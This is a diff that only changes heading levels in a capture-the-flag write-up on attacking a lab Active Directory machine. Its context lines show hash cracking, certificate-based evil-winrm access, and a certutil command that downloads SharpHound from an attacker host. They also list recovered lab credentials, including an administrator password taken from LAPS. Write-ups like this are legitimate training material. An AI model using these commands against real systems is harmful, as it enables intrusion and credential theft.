@@ -5,7 +5,7 @@
 ```
 If Active Directory => [[Synchronize NTP]] with the domain controller.
 
-# Content
+### Content
 
 - Kerberos enumeration
 - RPC Enumeration
@@ -16,7 +16,7 @@ If Active Directory => [[Synchronize NTP]] with the domain controller.
 - Powershell History hardcoded credentials
 - Abusing of LAPS_Reader group to dump LAPS credentials.
 
-# Reconnaissance
+### Reconnaissance
 
 Initial reconnaissance for TCP ports
 ```bash
@@ -261,7 +261,7 @@ smb: \HelpDesk\> dir
  LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 14:57:44
 ```
 
-# Exploitation
+### Exploitation
 
 The .zip file is password protected, so we extract its hash with zip2john and then proceed to crack it with hashcat: ^d3fbae
 ```bash
@@ -300,7 +300,7 @@ Now that we get this two files, we can proceed to access the machine:
 ```bash
 evil-winrm -i 10.10.11.152 -c publicCert.pem -k priv-key.pem -S 
 ```
-# Root privesc
+### Privilege Escalation
 It was not possible to upload SharpHound.exe nor SharpHound.ps1
 ```powershell
 *Evil-WinRM* PS C:\WIndows\Temp\PrivEsc> certutil -urlcache -f http://10.10.14.3/SharpHound.exe SharpHound.exe
@@ -410,9 +410,9 @@ Password   : k/lUoz3pm8]1ql0R[+i3{1n2
 Expiration : 2/11/2023 6:35:44 PM
 ```
 
-# Post Exploitation
+### Post Exploitation
 
-# Credentials
+### Credentials
 ```bash
 # winrm_backup.zip password
 supremelegacy
@@ -423,12 +423,12 @@ svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
 # Credentials for administrator
 administrator:k/lUoz3pm8]1ql0R[+i3{1n2
 ```
-# Notes
+### Notes
 
 - Evil-winrm can be used to authenticate with certificates, also is worth noting that if we want to authenticate via SSL we need to add the (-S) flag
 - Always lookup for hardcoded passwords on files specially on powershell history.
 - To check if we  have read access to an SMB share we need to use the `--shares` with crackmapexec or to use SMBMAP not only with SMBClient to be sure.
-# Resources:
+### References
 
 * [How to Extract Certificate and Private Key from PFX](https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/)
 * [Dumping LAPS](https://www.hackingarticles.in/credential-dumpinglaps/) 
